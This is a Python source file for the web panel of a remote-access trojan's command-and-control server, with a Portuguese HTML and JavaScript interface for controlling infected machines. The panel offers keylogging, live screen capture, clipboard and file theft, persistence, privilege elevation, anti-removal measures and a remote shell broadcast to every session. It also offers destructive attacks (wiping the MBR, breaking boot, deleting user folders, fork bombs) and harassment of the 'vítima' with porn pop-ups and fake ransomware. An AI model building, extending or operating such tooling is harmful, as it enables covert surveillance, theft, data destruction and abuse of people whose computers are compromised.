#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF web console -- the C2 from a browser.

    python web.py                 # C2 on :4444, panel on http://127.0.0.1:8080
    python web.py --agent         # also spawn a local agent so there is a session
    python web.py --token abc123  # require ?t=abc123 or X-Token header

Endpoints:
    GET  /                 panel
    GET  /api/sessions     session table
    GET  /api/frame        live JPEG frame
    POST /api/exec         {sid, op, args}
    POST /api/upload       {sid, path, data_b64}
    POST /api/agent        spawn a local agent
    GET  /loot/<file>      downloaded files / screenshots
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import server as S

LOOT = os.path.join(HERE, "loot")

PAGE = r"""<!doctype html>
<html><head><meta charset="utf-8"><title>RAF C2</title>
<style>
*{box-sizing:border-box}
body{margin:0;background:#0a0e13;color:#c9d7e6;font:13px/1.5 ui-monospace,Consolas,monospace;height:100vh;display:flex;overflow:hidden}
#side{width:290px;border-right:1px solid #1d2a38;display:flex;flex-direction:column;background:#0d131b}
#main{flex:1;display:flex;flex-direction:column;min-width:0}
h1{font-size:11px;letter-spacing:.2em;text-transform:uppercase;color:#5c7285;padding:12px 14px;margin:0;border-bottom:1px solid #1d2a38;font-weight:600}
#title{display:flex;justify-content:space-between;align-items:center;gap:10px}
#sessions{overflow:auto;flex:1}
.sess{padding:9px 14px;border-bottom:1px solid #141d27;cursor:pointer;border-left:3px solid transparent}
.sess:hover{background:#111b26}
.sess.on{background:#0f2231;border-left-color:#38bdf8}
.sess b{color:#38bdf8}
.sess small{display:block;color:#5c7285;font-size:11px}
.err{padding:14px;color:#f87171;font-size:12px;line-height:1.6}
.empty{padding:14px;color:#5c7285;font-size:12px;line-height:1.6}
#sidefoot{padding:10px;border-top:1px solid #1d2a38}
#out{flex:1;overflow:auto;padding:14px;white-space:pre-wrap;word-break:break-word;color:#a9bccf;min-height:120px}
#out .err{color:#f87171}
#out .cmd{color:#38bdf8}
#panel{display:flex;flex-wrap:wrap;gap:7px 16px;padding:9px 10px;border-top:1px solid #1d2a38;background:#0b1119}
.grp{display:flex;flex-wrap:wrap;gap:5px;align-items:center;max-width:100%}
.grp>span{color:#4d6275;font-size:9px;letter-spacing:.16em;text-transform:uppercase;margin-right:1px}
button{background:#152232;border:1px solid #1d2a38;color:#9fb3c8;padding:8px 11px;font:inherit;border-radius:4px;cursor:pointer}
button:hover{border-color:#38bdf8;color:#38bdf8}
.grp button{padding:4px 8px;font-size:11px}
#newagent{width:100%}
#bar{display:flex;gap:6px;padding:10px;border-top:1px solid #1d2a38;background:#101823}
input[type=text]{flex:1;min-width:200px;background:#080d13;border:1px solid #1d2a38;color:#c9d7e6;padding:9px 11px;font:inherit;border-radius:4px;outline:none}
input[type=text]:focus{border-color:#38bdf8}
.pill{font-size:11px;padding:1px 8px;border-radius:99px;background:#152232;color:#5c7285}
</style></head><body>
<div id="side">
  <h1>RAF // alvos</h1>
  <div id="sessions"></div>
  <div id="sidefoot"><button id="newagent">+ agente local</button></div>
</div>
<div id="main">
  <h1 id="title"><span id="who">nenhuma sessão</span><span class="pill" id="state">idle</span></h1>
  <div id="out">selecione uma sessão à esquerda</div>
  <div id="panel">
    <div class="grp"><span>recon</span>
      <button data-act="info">info</button>
      <button data-act="ls">ls</button>
      <button data-act="pwd">pwd</button>
      <button data-act="ps">processos</button>
      <button data-act="clipget">clipboard</button>
      <button data-act="shot">screenshot</button>
    </div>
    <div class="grp"><span>tela</span>
      <button data-act="live">tela ao vivo</button>
      <button data-act="placa">placa</button>
      <button data-act="placaoff">fechar placa</button>
      <button data-act="msg">mensagem</button>
      <button data-act="wall">papel de parede</button>
    </div>
    <div class="grp"><span>input</span>
      <button data-act="kstart">keylog on</button>
      <button data-act="kdump">keylog dump</button>
      <button data-act="kstop">keylog off</button>
      <button data-act="clipset">set clipboard</button>
    </div>
    <div class="grp"><span>arquivos</span>
      <button data-act="get">baixar</button>
      <button data-act="put">enviar</button>
    </div>
    <div class="grp"><span>sistema</span>
      <button data-act="kill">matar pid</button>
      <button data-act="sleep">sleep</button>
      <button data-act="reboot">reiniciar</button>
      <button data-act="shutdown">desligar</button>
      <button data-act="power">power</button>
    </div>
    <div class="grp"><span>abrir sites (alvo)</span>
      <button data-act="t_site">abrir site</button>
      <button data-act="t_xv">xvideos</button>
      <button data-act="t_yt">youtube</button>
      <button data-act="t_site_kiosk">quiosque</button>
      <button data-act="t_popup">popup x N</button>
      <button data-act="t_rick">rickroll</button>
    </div>
    <div class="grp"><span>troll</span>
      <button data-act="t_cursor">cursor off</button>
      <button data-act="t_lock">trava mouse</button>
      <button data-act="t_shake">tremer</button>
      <button data-act="t_swap">inverter</button>
      <button data-act="t_block">bloquear</button>
      <button data-act="t_tray">bandeja</button>
      <button data-act="t_monitor">monitor off</button>
      <button data-act="t_beep">som</button>
      <button data-act="t_taskbar">taskbar</button>
      <button data-act="t_scare">susto</button>
    </div>
    <div class="grp"><span>troll 2</span>
      <button data-act="t_flip">tela de cabeça</button>
      <button data-act="t_spin">girar 90</button>
      <button data-act="t_normal">endireitar</button>
      <button data-act="t_caps">capslock</button>
      <button data-act="t_siren">sirene</button>
      <button data-act="t_volume">volume max</button>
      <button data-act="t_bsod">tela azul</button>
      <button data-act="t_blackout">tela preta</button>
      <button data-act="t_update">falso update</button>
    </div>
    <div class="grp"><span>troll 3</span>
      <button data-act="t_fix">reverter tudo</button>
      <button data-act="t_wall">papel de parede</button>
      <button data-act="t_wall_ok">papel ok</button>
      <button data-act="t_icons">ícones</button>
      <button data-act="t_cursor_big">cursor gigante</button>
      <button data-act="t_cursor_ok">cursor ok</button>
      <button data-act="t_mouse_fast">mouse louco</button>
      <button data-act="t_mouse_ok">mouse ok</button>
      <button data-act="t_wshake">tremer janela</button>
      <button data-act="t_notepad">notepads</button>
      <button data-act="t_clip_garbage">clipboard lixo</button>
    </div>
    <div class="grp"><span>troll 4</span>
      <button data-act="t_speak">falar</button>
      <button data-act="t_type">digitar sozinho</button>
      <button data-act="t_wheel">roda louca</button>
      <button data-act="t_wheel_ok">roda ok</button>
      <button data-act="t_cd">gaveta cd</button>
      <button data-act="t_saver">protetor de tela</button>
      <button data-act="t_cmd_storm">enxurrada cmd</button>
      <button data-act="t_fakedel">excluindo...</button>
      <button data-act="t_ransom">ransomware falso</button>
    </div>
    <div class="grp"><span>estresse (hardware)</span>
      <button data-act="t_cpu">cpu 100%</button>
      <button data-act="t_ram">encher ram</button>
      <button data-act="t_ram_bomb">bomba ram</button>
      <button data-act="t_disk">encher disco</button>
      <button data-act="t_heat">esquentar</button>
      <button data-act="t_stress_all">tudo junto</button>
      <button data-act="t_stress_stop">parar</button>
    </div>
    <div class="grp"><span>ataque (kill)</span>
      <button data-act="a_bsod">crash kernel</button>
      <button data-act="a_killwin">matar windows</button>
      <button data-act="a_freeze">congelar input</button>
      <button data-act="a_net">matar rede</button>
      <button data-act="a_diskfull">encher disco</button>
      <button data-act="a_fork">fork bomb</button>
      <button data-act="a_oom">esgotar ram</button>
      <button data-act="a_reboot">reiniciar</button>
      <button data-act="a_off">desligar</button>
      <button data-act="a_loop">loop de boot</button>
      <button data-act="a_noboot">sem boot</button>
      <button data-act="a_mbr">destruir mbr</button>
      <button data-act="a_wipe">apagar arquivos</button>
      <button data-act="a_black">tela preta fixa</button>
    </div>
    <div class="grp"><span>persistência</span>
      <button data-act="persist">persistir</button>
      <button data-act="unpersist">remover</button>
    </div>
    <div class="grp"><span>defesa</span>
      <button data-act="stealth">status</button>
      <button data-act="elevate">elevar</button>
      <button data-act="lockdown">travar</button>
      <button data-act="unkillable">matar? off</button>
      <button data-act="log">log do alvo</button>
    </div>
    <div class="grp"><span>sessão</span>
      <button data-act="bcast">broadcast</button>
      <button data-act="close">desconectar</button>
      <button data-act="ver">versao</button>
      <button data-act="getexe">baixar exe</button>
      <button data-act="selfdestruct">autodestruir</button>
    </div>
  </div>
  <div id="bar">
    <input id="cmd" type="text" placeholder="comando livre  ·  whoami, dir, ipconfig, tasklist..." autocomplete="off">
    <button id="run">rodar</button>
  </div>
</div>
<input id="file" type="file" style="display:none">
<script>
const TOKEN = new URLSearchParams(location.search).get('t') || '';
let cur = null, SESSIONS = [], liveTimer = null, liveImg = null, liveWrap = null, liveFails = 0;

const $ = id => document.getElementById(id);
const out = $('out');

function log(line, cls) {
  const d = document.createElement('div');
  if (cls) d.className = cls;
  d.textContent = line;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
}

async function api(path, body) {
  const opt = body
    ? {method:'POST', headers:{'Content-Type':'application/json','X-Token':TOKEN}, body:JSON.stringify(body)}
    : {headers:{'X-Token':TOKEN}};
  const url = path + (TOKEN ? (path.includes('?') ? '&' : '?') + 't=' + TOKEN : '');
  const r = await fetch(url, opt);
  return r.json();
}

let errShown = false;

function showErr(msg) {
  if (errShown) return;
  errShown = true;
  const box = $('sessions');
  box.textContent = '';
  const d = document.createElement('div');
  d.className = 'err';
  d.textContent = msg;
  box.appendChild(d);
  const inp = document.createElement('input');
  inp.type = 'text';
  inp.placeholder = 'cole o token aqui';
  inp.style.cssText = 'margin:8px 14px;width:calc(100% - 28px);background:#080d13;' +
    'border:1px solid #1d2a38;color:#c9d7e6;padding:7px 9px;font:inherit;border-radius:4px;outline:none';
  const btn = document.createElement('button');
  btn.textContent = 'entrar';
  btn.style.cssText = 'margin:0 14px 10px;padding:6px 14px';
  btn.onclick = () => {
    const v = inp.value.trim();
    if (v) location.href = '/?t=' + encodeURIComponent(v);
  };
  inp.onkeydown = e => { if (e.key === 'Enter') btn.onclick(); };
  box.appendChild(inp);
  box.appendChild(btn);
}

async function refresh() {
  let j;
  try { j = await api('/api/sessions'); }
  catch (e) { showErr('sem conexao com o painel'); return; }
  if (!j || !Array.isArray(j.sessions)) {
    showErr('TOKEN AUSENTE OU INVALIDO — abra com ?t=SEU_TOKEN na barra de endereco');
    return;
  }
  SESSIONS = j.sessions;
  errShown = false;
  const box = $('sessions');
  box.textContent = '';
  if (!SESSIONS.length) {
    const d = document.createElement('div');
    d.className = 'empty';
    d.textContent = 'nenhum agente conectado — clique em "+ agente local" abaixo';
    box.appendChild(d);
  }
  SESSIONS.forEach(s => {
    const d = document.createElement('div');
    d.className = 'sess' + (cur === s.id ? ' on' : '');
    const b = document.createElement('b');
    b.textContent = s.id;
    d.appendChild(b);
    d.appendChild(document.createTextNode('  ' + s.user + '@' + s.host));
    const sm = document.createElement('small');
    sm.textContent = s.addr + ' · ' + s.os + ' · ' + (s.admin ? 'admin' : 'user') + ' · ' + (s.transport || 'tcp') + (s.alive ? (s.seen > 8 ? ' · ' + s.seen + 's atras' : ' · ok') : ' · morto');
    d.appendChild(sm);
    d.onclick = () => {
      if (liveTimer) liveStop('tela ao vivo: off (sessao trocada)');
      cur = s.id;
      $('who').textContent = s.id + ' — ' + s.user + '@' + s.host;
      $('state').textContent = s.alive ? 'live' : 'dead';
      refresh();
    };
    box.appendChild(d);
  });
}

async function exec(op, args, label) {
  if (!cur) { log('! selecione uma sessão', 'err'); return; }
  $('state').textContent = 'busy';
  log('$ ' + (label || op), 'cmd');
  try {
    const j = await api('/api/exec', {sid: cur, op: op, args: args || {}});
    if (!j.ok) log('! ' + (j.out || 'erro'), 'err');
    else if (j.out) log(j.out);
    if (j.url) {
      log('salvo -> ' + j.url);
      if (/\.(bmp|png|jpg|jpeg)$/i.test(j.url)) {
        const img = document.createElement('img');
        img.src = j.url + (TOKEN ? '?t=' + TOKEN : '');
        img.style.cssText = 'max-width:100%;border:1px solid #1d2a38;margin-top:8px;display:block';
        out.appendChild(img);
      }
    }
  } catch (e) { log('! ' + e, 'err'); }
  $('state').textContent = 'ready';
}

function liveStop(msg) {
  if (liveTimer) { clearInterval(liveTimer); liveTimer = null; }
  if (liveImg) {
    if (liveImg.dataset && liveImg.dataset.url) URL.revokeObjectURL(liveImg.dataset.url);
    liveImg.remove(); liveImg = null;
  }
  if (liveWrap) { liveWrap.remove(); liveWrap = null; }
  liveFails = 0;
  if (msg) log(msg);
}

function toggleLive() {
  if (liveTimer) { liveStop('tela ao vivo: off'); return; }
  if (!cur) { log('! selecione uma sessão', 'err'); return; }
  const sid = cur;
  liveWrap = document.createElement('div');
  liveWrap.style.cssText = 'margin-top:8px;border:1px solid #1d2a38;background:#000;max-width:100%;line-height:0';
  liveImg = document.createElement('img');
  liveImg.style.cssText = 'display:block;width:100%;height:auto';
  liveImg.alt = 'aguardando frame...';
  liveWrap.appendChild(liveImg);
  out.appendChild(liveWrap);
  log('tela ao vivo: on');
  liveFails = 0;
  let busy = false;

  const fail = (m) => {
    liveFails++;
    if (liveFails <= 3) log('! tela: ' + m, 'err');
    if (liveFails >= 6) liveStop('tela ao vivo: desligada (' + m + ')');
  };

  // troca o quadro so quando a imagem nova ja decodificou: sem piscar
  const paint = (blob) => {
    if (!liveImg || cur !== sid) return;
    const url = URL.createObjectURL(blob);
    const probe = new Image();
    probe.onload = () => {
      if (!liveImg || cur !== sid) { URL.revokeObjectURL(url); return; }
      const old = liveImg.dataset.url || '';
      liveImg.src = url;
      liveImg.dataset.url = url;
      if (old) URL.revokeObjectURL(old);
      if (liveFails) { liveFails = 0; log('tela ao vivo: ok'); }
    };
    probe.onerror = () => { URL.revokeObjectURL(url); fail('frame invalido'); };
    probe.src = url;
  };

  const tick = async () => {
    if (busy || !liveTimer || cur !== sid) return;
    busy = true;
    try {
      const url = '/api/frame?sid=' + encodeURIComponent(sid) +
        (TOKEN ? '&t=' + TOKEN : '') + '&w=1100&q=60&_=' + Date.now();
      const r = await fetch(url, {cache: 'no-store'});
      if (r.ok) {
        paint(await r.blob());
      } else {
        let j = null;
        try { j = await r.json(); } catch (e) {}
        // reserva: pede o frame embutido (agente v3.1+ responde b64 em qualquer transporte)
        const j2 = await api('/api/exec', {sid: sid, op: 'frame',
                                           args: {b64: true, width: 1100, quality: 60}});
        if (j2 && j2.ok && j2.out) {
          const bin = atob(j2.out), arr = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
          paint(new Blob([arr], {type: 'image/jpeg'}));
        } else {
          fail((j && j.out) || (j2 && j2.out) || ('erro ' + r.status));
        }
      }
    } catch (e) { fail(String(e)); }
    busy = false;
  };

  liveTimer = setInterval(tick, 1000);
  tick();
}

const ask = (msg, def) => { const v = prompt(msg, def || ''); return v === null ? null : v; };

const ACT = {
  info:     () => exec('sysinfo', {}, 'info'),
  ls:       () => { const p = ask('pasta (vazio = atual)'); if (p !== null) exec('ls', {path: p || null}, 'ls ' + p); },
  pwd:      () => exec('pwd', {}, 'pwd'),
  ps:       () => exec('ps', {}, 'processos'),
  clipget:  () => exec('clip', {action:'get'}, 'clipboard'),
  clipset:  () => { const t = ask('texto para o clipboard do alvo'); if (t !== null) exec('clip', {action:'set', text:t}, 'set clipboard'); },
  shot:     () => exec('screenshot', {}, 'screenshot'),
  live:     () => toggleLive(),
  placa:    () => { const t = ask('texto da placa', 'VOCE FOI HACKEADO'); if (t) exec('placa', {text:t, seconds:0, bg:'#000000', fg:'#ff2d2d'}, 'placa'); },
  placaoff: () => exec('placa', {action:'off'}, 'fechar placa'),
  msg:      () => { const t = ask('mensagem para a vítima'); if (t) exec('msg', {text:t}, 'mensagem'); },
  t_cursor: () => { const s = ask('segundos com o cursor escondido', '30'); if (s !== null) exec('troll', {action:'cursor', seconds: parseInt(s) || 30}, 'cursor off ' + s + 's'); },
  t_lock:   () => { const s = ask('segundos com o mouse travado no lugar', '20'); if (s !== null) exec('troll', {action:'lock', seconds: parseInt(s) || 20}, 'trava mouse ' + s + 's'); },
  t_shake:  () => { const s = ask('segundos tremendo o cursor', '6'); if (s !== null) exec('troll', {action:'shake', seconds: parseInt(s) || 6}, 'tremer ' + s + 's'); },
  t_swap:   () => exec('troll', {action:'swap'}, 'inverter botões do mouse'),
  t_block:  () => { const s = ask('segundos com teclado+mouse bloqueados', '8'); if (s !== null) exec('troll', {action:'block', seconds: parseInt(s) || 8}, 'bloquear ' + s + 's'); },
  t_tray:   () => { const a = ask('bandeja: open | close', 'open'); if (a) exec('troll', {action:'tray', state:a}, 'bandeja ' + a); },
  t_monitor:() => exec('troll', {action:'monitor'}, 'monitor off'),
  t_beep:   () => exec('troll', {action:'beep', seconds:3}, 'som'),
  t_taskbar:() => { const a = ask('taskbar: hide | show', 'hide'); if (a) exec('troll', {action: a === 'show' ? 'taskbar_show' : 'taskbar'}, 'taskbar ' + a); },
  t_scare:  () => { const s = ask('segundos de susto (cursor escondido + tremor + erro falso)', '8'); if (s !== null) exec('troll', {action:'susto', seconds: parseInt(s) || 8}, 'susto ' + s + 's'); },
  t_flip:   () => { const s = ask('segundos com a tela de cabeça pra baixo (0 = fixo)', '20'); if (s !== null) exec('troll', {action:'flip', seconds: (s === '' ? 20 : (parseInt(s) || 0))}, 'tela de cabeça'); },
  t_spin:   () => { const s = ask('segundos com a tela girada 90° (0 = fixo)', '20'); if (s !== null) exec('troll', {action:'spin', seconds: (s === '' ? 20 : (parseInt(s) || 0))}, 'tela 90°'); },
  t_normal: () => exec('troll', {action:'normal'}, 'endireitar'),
  t_caps:   () => { const s = ask('segundos com o CapsLock travado ligado', '60'); if (s !== null) exec('troll', {action:'caps', seconds: parseInt(s) || 60}, 'capslock ' + s + 's'); },
  t_siren:  () => { const s = ask('segundos de sirene', '10'); if (s !== null) exec('troll', {action:'siren', seconds: parseInt(s) || 10}, 'sirene ' + s + 's'); },
  t_volume: () => exec('troll', {action:'volume_max'}, 'volume no máximo'),
  t_bsod:   () => { const s = ask('segundos de tela azul falsa', '25'); if (s !== null) exec('troll', {action:'bsod', seconds: parseInt(s) || 25}, 'tela azul ' + s + 's'); },
  t_blackout: () => { const s = ask('segundos de tela preta', '10'); if (s !== null) exec('troll', {action:'blackout', seconds: parseInt(s) || 10}, 'tela preta ' + s + 's'); },
  t_update: () => { const s = ask('segundos de "atualizando o Windows" falso', '30'); if (s !== null) exec('troll', {action:'fake_update', seconds: parseInt(s) || 30}, 'falso update ' + s + 's'); },
  t_fix:    () => exec('troll', {action:'fix'}, 'reverter tudo'),
  t_wall:   () => { const c = ask('cor do papel de parede (hex)', '#7a0010'); if (c) exec('troll', {action:'wallpaper', color:c}, 'papel ' + c); },
  t_wall_ok:() => exec('troll', {action:'wallpaper_restore'}, 'papel de parede ok'),
  t_icons:  () => exec('troll', {action:'desktop_icons'}, 'ícones da área de trabalho'),
  t_cursor_big: () => exec('troll', {action:'cursor_big'}, 'cursor gigante'),
  t_cursor_ok:  () => exec('troll', {action:'cursor_normal'}, 'cursor normal'),
  t_mouse_fast: () => exec('troll', {action:'mouse_fast'}, 'mouse louco'),
  t_mouse_ok:   () => exec('troll', {action:'mouse_normal'}, 'mouse normal'),
  t_wshake: () => { const s = ask('segundos tremendo a janela em foco', '5'); if (s !== null) exec('troll', {action:'window_shake', seconds: parseInt(s) || 5}, 'tremer janela ' + s + 's'); },
  t_notepad:() => { const n = ask('quantos notepads abrir', '8'); if (n) exec('troll', {action:'notepad', count: parseInt(n) || 8}, 'notepads x' + n); },
  t_clip_garbage: () => exec('troll', {action:'clip_garbage'}, 'clipboard com lixo'),
  t_site:   () => { const u = ask('site para abrir no alvo (xvideos, youtube, pornhub, google... ou url/termo)', 'xvideos'); if (u) exec('troll', {action:'openurl', url:u}, 'abrir ' + u); },
  t_xv:     () => exec('troll', {action:'openurl', url:'xvideos'}, 'abrir xvideos'),
  t_yt:     () => exec('troll', {action:'openurl', url:'youtube'}, 'abrir youtube'),
  t_site_kiosk: () => { const u = ask('site em tela cheia (só fecha com Alt+F4)', 'youtube'); if (u) exec('troll', {action:'kiosk', url:u}, 'quiosque ' + u); },
  t_popup:  () => { const u = ask('site para abrir em várias abas', 'xvideos'); if (!u) return;
                    const n = ask('quantas abas/janelas (1-12)', '5'); if (n === null) return;
                    exec('troll', {action:'openurl', url:u, count: parseInt(n) || 5}, u + ' x' + n); },
  t_rick:   () => exec('troll', {action:'rickroll'}, 'rickroll em tela cheia'),
  t_speak:  () => { const t = ask('o que o PC do alvo vai falar em voz alta', 'Você foi hackeado. Eu estou vendo a sua tela.'); if (t) exec('troll', {action:'speak', text:t}, 'falar'); },
  t_type:   () => { const t = ask('texto para digitar sozinho na janela ativa (vazio = lixo aleatório)'); if (t === null) return; exec('troll', {action:'type_garbage', text:t}, 'digitando sozinho'); },
  t_wheel:  () => { const l = ask('linhas por entalhe da roda (100 = hipersensível, 1 = travada)', '100'); if (l !== null) exec('troll', {action:'wheel', lines: parseInt(l) || 100}, 'roda ' + l); },
  t_wheel_ok: () => exec('troll', {action:'wheel_ok'}, 'roda normal'),
  t_cd:     () => { const n = ask('quantas vezes abrir/fechar a gaveta do CD', '3'); if (n !== null) exec('troll', {action:'cd_tray', count: parseInt(n) || 3}, 'gaveta cd x' + n); },
  t_saver:  () => exec('troll', {action:'screensaver'}, 'protetor de tela'),
  t_cmd_storm: () => { const n = ask('quantas janelas de cmd abrir', '6'); if (n !== null) exec('troll', {action:'cmd_storm', count: parseInt(n) || 6}, 'cmd x' + n); },
  t_fakedel: () => { const s = ask('segundos da tela falsa de exclusão de arquivos', '25'); if (s !== null) exec('troll', {action:'fake_delete', seconds: parseInt(s) || 25}, 'excluindo ' + s + 's'); },
  t_ransom: () => { const s = ask('segundos da nota falsa de ransomware', '45'); if (s !== null) exec('troll', {action:'fake_ransom', seconds: parseInt(s) || 45}, 'ransom ' + s + 's'); },
  t_cpu:    () => { const s = ask('segundos queimando todos os núcleos da CPU', '60'); if (s !== null) exec('troll', {action:'stress_cpu', seconds: parseInt(s) || 60}, 'cpu 100% ' + s + 's'); },
  t_ram:    () => { const p = ask('porcentagem da RAM a encher (10-95)', '80'); if (p === null) return;
                    const s = ask('segundos segurando a RAM cheia', '30'); if (s === null) return;
                    exec('troll', {action:'stress_ram', pct: parseInt(p) || 80, seconds: parseInt(s) || 30}, 'ram ' + p + '% por ' + s + 's'); },
  t_ram_bomb: () => { const s = ask('segundos de bomba de RAM (95% — trava tudo)', '15'); if (s !== null) exec('troll', {action:'ram_bomb', seconds: parseInt(s) || 15}, 'bomba ram ' + s + 's'); },
  t_disk:   () => { const m = ask('quantos MB escrever no disco (desgasta o SSD)', '4096'); if (m === null) return; exec('troll', {action:'stress_disk', mb: parseInt(m) || 4096}, 'disco ' + m + 'MB'); },
  t_heat:   () => { const s = ask('segundos de aquecimento (todos os núcleos + alto desempenho)', '120'); if (s !== null) exec('troll', {action:'heat', seconds: parseInt(s) || 120}, 'esquentar ' + s + 's'); },
  t_stress_all: () => { const s = ask('segundos de estresse total (cpu + ram + disco)', '60'); if (s !== null) exec('troll', {action:'stress_all', seconds: parseInt(s) || 60}, 'estresse total ' + s + 's'); },
  t_stress_stop: () => exec('troll', {action:'stress_stop'}, 'parar estresse'),
  a_bsod:   () => { if (confirm('CRASH DE KERNEL real em ' + cur + '? A máquina reinicia na hora.')) exec('attack', {action:'bsod'}, 'crash kernel'); },
  a_killwin:() => { if (confirm('Matar os processos críticos do Windows em ' + cur + '? Derruba o sistema agora.')) exec('attack', {action:'killwin'}, 'matar windows'); },
  a_freeze: () => { const s = ask('segundos congelado (0 = até reiniciar)', '0'); if (s !== null) exec('attack', {action:'freeze', seconds: parseInt(s) || 0}, 'congelar input'); },
  a_net:    () => { if (confirm('Derrubar toda a rede de ' + cur + '? (adaptadores, rotas e firewall)')) exec('attack', {action:'net'}, 'matar rede'); },
  a_diskfull: () => { const m = ask('quantos MB escrever até encher o disco', '20000'); if (m !== null) exec('attack', {action:'disk_full', mb: parseInt(m) || 20000}, 'encher disco ' + m + 'MB'); },
  a_fork:   () => { if (confirm('Fork bomb em ' + cur + '? A máquina trava e só volta no reset.')) exec('attack', {action:'fork', count: 8}, 'fork bomb'); },
  a_oom:    () => { const n = ask('quantos processos alocando RAM (1-24)', '8'); if (n !== null) exec('attack', {action:'oom', count: parseInt(n) || 8}, 'esgotar ram x' + n); },
  a_reboot: () => { const s = ask('segundos até reiniciar', '0'); if (s !== null) exec('attack', {action:'reboot', seconds: parseInt(s) || 0}, 'reiniciar'); },
  a_off:    () => { if (confirm('DESLIGAR ' + cur + ' agora?')) exec('attack', {action:'poweroff', seconds: 0}, 'desligar'); },
  a_loop:   () => { if (confirm('Loop de boot em ' + cur + '? Reinicia a cada logon, sem parar.')) exec('attack', {action:'boot_loop'}, 'loop de boot'); },
  a_noboot: () => { if (confirm('DESTRUIR O BOOT de ' + cur + '? (BCD + winload) O Windows não sobe mais.')) exec('attack', {action:'no_boot'}, 'sem boot'); },
  a_mbr:    () => { if (confirm('ZERAR O MBR/GPT de ' + cur + '? Discos 0 e 1. Não tem volta sem reinstalar.')) exec('attack', {action:'mbr', count: 2}, 'destruir mbr'); },
  a_wipe:   () => { if (confirm('APAGAR Desktop, Documentos, Downloads, Imagens, Vídeos e Música de ' + cur + '?')) exec('attack', {action:'wipe'}, 'apagar arquivos'); },
  a_black:  () => { const s = ask('segundos com o monitor apagado (0 = 1 hora)', '3600'); if (s !== null) exec('attack', {action:'blackout', seconds: parseInt(s) || 3600}, 'tela preta'); },
  wall:     () => { const p = ask('caminho de imagem no alvo (ex: C:\\\\Windows\\\\Web\\\\Wallpaper\\\\Windows\\\\img0.jpg)'); if (p) exec('wallpaper', {path:p}, 'papel de parede'); },
  kstart:   () => exec('keylog', {action:'start'}, 'keylog on'),
  kdump:    () => exec('keylog', {action:'dump'}, 'keylog dump'),
  kstop:    () => exec('keylog', {action:'stop'}, 'keylog off'),
  get:      () => { const p = ask('caminho remoto do arquivo'); if (p) exec('download', {path:p}, 'baixar ' + p); },
  put:      () => $('file').click(),
  kill:     () => { const p = ask('PID'); if (p) exec('kill', {pid: parseInt(p) || 0}, 'matar ' + p); },
  sleep:    () => { const s = ask('segundos de reconexão'); if (s !== null) exec('sleep', {seconds: parseInt(s) || 0}, 'sleep ' + s); },
  power:    () => { const a = ask('lock | reboot | shutdown | logoff | hibernate'); if (a) exec('power', {action:a}, 'power ' + a); },
  reboot:   () => { if (confirm('REINICIAR o PC ' + cur + ' agora?')) exec('power', {action:'reboot'}, 'reiniciar'); },
  shutdown: () => { if (confirm('DESLIGAR o PC ' + cur + ' agora?')) exec('power', {action:'shutdown'}, 'desligar'); },
  persist:  () => exec('persist', {}, 'persistir'),
  unpersist:() => exec('unpersist', {}, 'remover persistência'),
  stealth:  () => exec('stealth', {}, 'status defesa'),
  elevate:  () => exec('elevate', {}, 'elevar para admin/system'),
  lockdown: () => exec('lockdown', {}, 'travar remoção'),
  unkillable: () => { const s = ask('estado do processo crítico (on/off)', 'off');
                      if (s !== null) exec('unkillable', {state: s.trim() || 'off'}, 'critical ' + s); },
  log:      () => exec('log', {}, 'log do alvo'),
  bcast:    () => {
    const c = ask('comando para TODAS as sessões');
    if (!c) return;
    SESSIONS.filter(s => s.alive).forEach(s => {
      api('/api/exec', {sid: s.id, op: 'shell', args: {cmd: c}}).then(j => {
        log('[' + s.id + '] ' + (j.out || ''), j.ok ? null : 'err');
      });
    });
  },
  getexe:   () => { location.href = '/exe' + location.search; },
  ver:      () => exec('ver', {}, 'versao do agente'),
  close:    () => { if (confirm('desconectar o agente ' + cur + '?')) exec('exit', {}, 'desconectar'); },
  selfdestruct: () => {
    if (!cur) { log('! selecione uma sessão', 'err'); return; }
    if (!confirm('AUTODESTRUIÇÃO no PC ' + cur + ': apaga o agente, a persistência e os arquivos.')) return;
    if (prompt('digite APAGAR para confirmar') !== 'APAGAR') { log('autodestruição cancelada'); return; }
    exec('selfdestruct', {}, 'autodestruição');
  }
};

document.querySelectorAll('[data-act]').forEach(b => {
  b.onclick = () => { const f = ACT[b.dataset.act]; if (f) f(); };
});

function runLine() {
  const txt = $('cmd').value.trim();
  if (!txt) return;
  $('cmd').value = '';
  const p = txt.split(/\s+/), v = p[0].toLowerCase(), rest = p.slice(1);
  if (v === 'ls') return exec('ls', {path: rest[0] || null}, txt);
  if (v === 'cd') return exec('cd', {path: rest.join(' ')}, txt);
  if (v === 'pwd') return exec('pwd', {}, txt);
  if (v === 'info') return exec('sysinfo', {}, txt);
  if (v === 'ps') return exec('ps', {}, txt);
  if (v === 'screenshot') return exec('screenshot', {}, txt);
  if (v === 'keylog') return exec('keylog', {action: rest[0] || 'dump'}, txt);
  if (v === 'placa') return exec('placa', rest[0] === 'off' ? {action:'off'} : {text: rest.join(' ')}, txt);
  if (v === 'msg') return exec('msg', {text: rest.join(' ')}, txt);
  if (v === 'persist' || v === 'unpersist' || v === 'close') return exec(v, {}, txt);
  if (v === 'get') return exec('download', {path: rest.join(' ')}, txt);
  if (v === 'kill') return exec('kill', {pid: parseInt(rest[0]) || 0}, txt);
  return exec('shell', {cmd: txt}, txt);
}

$('run').onclick = runLine;
$('cmd').addEventListener('keydown', e => { if (e.key === 'Enter') runLine(); });
$('newagent').onclick = async () => { const j = await api('/api/agent', {}); log(j.out || ('agente pid ' + j.pid)); };
$('file').onchange = async () => {
  const f = $('file').files[0];
  if (!f || !cur) return;
  const remote = prompt('caminho remoto:', 'C:\\\\Users\\\\Public\\\\' + f.name);
  if (!remote) return;
  const buf = await f.arrayBuffer();
  let bin = ''; const bytes = new Uint8Array(buf);
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  log('$ put ' + f.name + ' -> ' + remote, 'cmd');
  const j = await api('/api/upload', {sid: cur, path: remote, data_b64: btoa(bin)});
  log((j.ok ? '' : '! ') + (j.out || ''), j.ok ? null : 'err');
  $('file').value = '';
};

refresh();
